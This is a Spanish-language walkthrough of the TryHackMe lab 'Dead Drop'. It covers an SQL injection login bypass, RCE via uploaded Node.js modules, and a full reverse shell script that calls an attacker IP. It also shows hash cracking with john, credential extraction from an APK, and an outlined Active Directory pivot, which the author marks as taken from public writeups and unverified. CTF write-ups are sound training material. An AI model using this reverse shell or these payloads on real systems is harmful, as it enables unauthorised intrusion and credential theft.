# TryHackMe — Dead Drop (caída muerta)

**Sala:** Dead Drop
**Plataforma:** TryHackMe
**Dificultad:** Media (~90 min, red de 3 máquinas)
**Tema:** SQLi en login · **RCE subiendo `.js` y usando *Preview*** · Reverse shell con Penelope · Crackeo `sha512crypt` · Ingeniería inversa de APK (jadx) · Pivote y Active Directory
**Objetivo:** Comprometer el **Domain Controller** y leer la flag del escritorio de `Administrator`.

> **Resumen en una línea:** la web de *DeadDrop Ltd* (ficheros compartidos) cae con **SQLi en el login**; el gestor de ficheros ejecuta los `.js` subidos con *Preview* → **RCE** como `node` → en `backup/` hay un `shadow.bak` con el hash de `svc-drop` que `john` rompe en segundos → SSH al servidor web → el **APK** de la app esconde las credenciales de dominio `j.harris` → desde ahí, pivote a la LAN interna (`192.168.11.0/24`) hasta el DC.

---

## 0. Información de la máquina (red interna)

La sala es una **red**, no una máquina suelta. Solo el webserver es alcanzable directamente por VPN; el resto está detrás de él:

| Máquina | Rol | IP |
| --- | --- | --- |
| DeadDrop-WEB (WebServer) | DMZ — app Node.js | `192.168.11.200` |
| DEADDROP-WRK | Estación de trabajo Windows | `192.168.11.51` |
| DEADDROP-DC | Domain Controller (objetivo final) | `192.168.11.100` |

![[Pasted image 20261118235042.png]]

*Mapa de la habitación: las dos Windows no se pueden tocar hasta hacer el pivote.*

---

## 1. Reconocimiento (Nmap)

```bash
nmap -sV -sC 192.168.11.200
```

![[Pasted image 20261118235056.png]]

- **22/tcp** → OpenSSH.
- **80/tcp** → HTTP con redirección: `http-title: Did not follow redirect to /login` — la app vive en `/login`.
- El resto de puertos, `998 filtered` (firewall que no responde).

> ⚠️ **Fallo tonto documentado:** en la captura se ve `nmap sV -sC ...` → `Error resolving "sV"`. Los flags de nmap llevan **guion** (`-sV`); sin él, nmap intenta resolver `sV` como hostname.

---

## 2. Login y bypass por SQL injection

```url
http://192.168.11.200/login
```

![[Pasted image 20261118235138.png]]

*DeadDrop — "Secure File Sharing Platform" (el autofill `laura.hayes` del navegador es puro ruido).*

El formulario es el clásico objetivo de SQLi. Bypass estándar en el campo de usuario:

```
admin'--
```

```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = '...'
```

El `--` comenta la comprobación de contraseña y entramos como administrador.

---

## 3. El gestor de ficheros (y las pruebas de inyección)

Dentro hay un gestor con **Upload / Preview / Rename / Delete**:

![[Pasted image 20261119001814.png]]

*Se subieron ficheros con nombres payload para ver qué filtra la app: `sleep 0` / `sleep 4` (time-based), ESI (`<!--esi-->`), XSS (`a4mbo"><a>zjrki`)...*

- Todos pesan 5.4 KB (mismo fichero de prueba con distintos nombres) y la app los muestra tal cual → el filtrado de nombres es laxo.
- Lo que importa no es el nombre: es qué hace el botón **Preview**.

---

## 4. RCE — *Preview* ejecuta lo que subes

### 4.1 Prueba de concepto

El servidor hace `require()` del fichero subido y muestra `module.exports`. Se sube un módulo que solo ejecuta `id`:

```js
const { execSync } = require('child_process');

module.exports = execSync('id').toString();
```

Al pulsar **Preview**:

![[Pasted image 20261119001751.png]]

```
uid=996(node) gid=996(node) groups=996(node)
```

**RCE confirmada** como usuario `node`.

### 4.2 Reverse shell

Con `nano exploit.js` se monta la reverse shell (`net.Socket` + `spawn('/bin/sh')`), apuntando a la IP del atacante en la VPN de THM:

![[Pasted image 20261119003214.png]]

```js
const net = require('net');
const { spawn } = require('child_process');

const HOST = '192.168.21.28'; // IP del atacante
const PORT = 4444;

const shell = spawn('/bin/sh', [], { stdio: ['pipe', 'pipe', 'pipe'] });
const client = new net.Socket();

client.connect(PORT, HOST, () => {
  client.write('[+] Reverse shell conectada\n');
  shell.stdout.pipe(client);
  shell.stderr.pipe(client);
  client.pipe(shell.stdin);
});

client.on('close', () => shell.kill());
client.on('error', () => {});

module.exports = 'ok';
```

- `module.exports = 'ok'` hace que el *Preview* no se queje mientras el socket trabaja en segundo plano.
- Escuchando en Kali con **Penelope** en el 4444 (ver `Comando Rapido/Penelope — reverse shell.md`).

---

## 5. Looting: `shadow.bak` en `backup/`

La shell llega a Penelope como sesión `192.168.11.200 UNIX`:

![[Pasted image 20261119003247.png]]

```bash
id                      # uid=996(node)...
ls                      # app.js  backup  db  node_modules  package*.json
                        # proof.txt  public  reverse.elf  uploads  views
cd backup
ls -la                  # shadow.bak (135 bytes, legible por todos)
cat shadow.bak
```

```
svc-drop:$6$f1331af25300c7f3$7twueSf8eUyvgYnPWElPYpspGgBuYJ.TMGrPZ2OBC6pGq18ZGkkPke950tRlQ3EpiRLWEqghnqkh2BOHfdCCH0:19700:0:99999:7:::
```

- `$6$` = **SHA-512 crypt**.
- `proof.txt` y `reverse.elf` también están a la vista en la webroot (herramientas dejadas por "otros" / pistas de la sala).

---

## 6. Crackeo del hash → SSH

```bash
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![[Pasted image 20261119005527.png]]

```
dropsofjupiter   (svc-drop)
```

**Respuesta de la sala** («¿Qué contraseña le otorga acceso SSH al servidor web?») → `dropsofjupiter`.

```bash
ssh svc-drop@192.168.11.200
```

---

## 7. El APK: credenciales de dominio a la vista

En el home de `svc-drop` hay herramientas de pivote y el APK de la app:

```bash
ls
# agent  backup  chisel-linux  deaddrop-mobile.apk  linepeas.sh  snap

python3 -m http.server 8080    # para bajarse el APK (o scp, ver abajo)
```

![[Pasted image 20261119014631.png]]

```bash
scp svc-drop@192.168.11.200:/home/svc-drop/backup/deaddrop-mobile.apk .
jadx-gui deaddrop-mobile.apk
```

En `com/deaddrop/mobile/Config.java` (clases de `classes3.dex`):

![[Pasted image 20261119014601.png]]

```java
public static final String API_ENDPOINT   = "http://internal.tryhackme.loc/api/v1";
public static final String DEFAULT_PASSWORD = "DropsOfJupiter2026!";
public static final String DEFAULT_USERNAME = "j.harris";
public static final String ENVIRONMENT     = "production";
```

**Credenciales de dominio:** `j.harris` / `DropsOfJupiter2026!`

> Lección: **un cliente (APK, app de escritorio, JS del navegador) nunca es un secreto** — todo lo compilado ahí se lee con `jadx`.

---

## 8. Pendiente: pivote y Active Directory

En las capturas se corta aquí, pero el home de `svc-drop` ya deja las herramientas listas (`agent`, `chisel-linux`) y la sala exige llegar al DC. Según los writeups públicos, el tramo que falta es:

1. **Pivote** con ligolo-ng (el `agent.exe` ya está en la máquina) o `chisel` hacia `192.168.11.0/24`.
2. Enumeración AD con `nxc smb` / `nxc ldap` usando `j.harris` / `DropsOfJupiter2026!`.
3. Ataque anidado de grupos: **`ITSupport` está anidado en `Domain Admins`** y `j.harris` tiene permiso de `AddMember` sobre `ITSupport` → añadirse y escalar en dos saltos.
4. Flag final en `C:\Users\Administrator\Desktop\flag.txt` (p. ej. `proxychains nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' -x "type C:\Users\Administrator\Desktop\flag.txt"`).

> ⚠️ **Pendiente de completar con capturas propias.** Este tramo está descrito a partir de writeups públicos; verifica los pasos y la flag en tu propia instancia.

---

## 9. Flags y respuestas

| Pregunta / Flag | Valor | Estado |
| --- | --- | --- |
| Contraseña SSH de `svc-drop` | `dropsofjupiter` | ✅ captura propia (john) |
| Credenciales ocultas en el APK | `j.harris` / `DropsOfJupiter2026!` | ✅ captura propia (jadx) |
| Flag del Domain Controller | pendiente | ⚠️ writeups, sin captura propia |

---

## 10. Lecciones

1. **SQLi en login = `admin'--`** — el bypass más barato que existe; probarlo siempre antes que nada.
2. **Upload + función que *evalúa* = RCE**: aquí `Preview` hacía `require()` del `.js` subido. Cualquier app que "previsualice" código ajeno es ejecución.
3. **Prueba de concepto primero**: `execSync('id')` en `module.exports` confirma la ejecución antes de complicarte con la reverse shell.
4. **`shadow.bak` en `backup/`** — revisar siempre los directorios de la webroot; un hash `$6$` con rockyou cae en segundos (`john --format=sha512crypt`).
5. **Los APKs filtran credenciales**: `Config.java` con usuario y contraseña en texto plano. El lado cliente nunca guarda secretos.
6. **Lee la salida completa del nmap**: el error `Error resolving "sV"` (falta el guion) habría arruinado el escaneo si no lo hubieras corregido.
7. **Penelope aguanta varias sesiones** — shell 1 (navegación) y shell 2 (`backup/`) sin perder el hilo.

> Comandos relacionados: `Comando Rapido/Nmap.md`, `Comando Rapido/Enumeracion web.md`, `Comando Rapido/Reverse shell Node.js.md`, `Comando Rapido/Penelope — reverse shell.md`, `Comando Rapido/Fuerza bruta y crackeo.md`, `Comando Rapido/Shells y transferencia.md`, `Comando Rapido/SMB y Active Directory.md`.
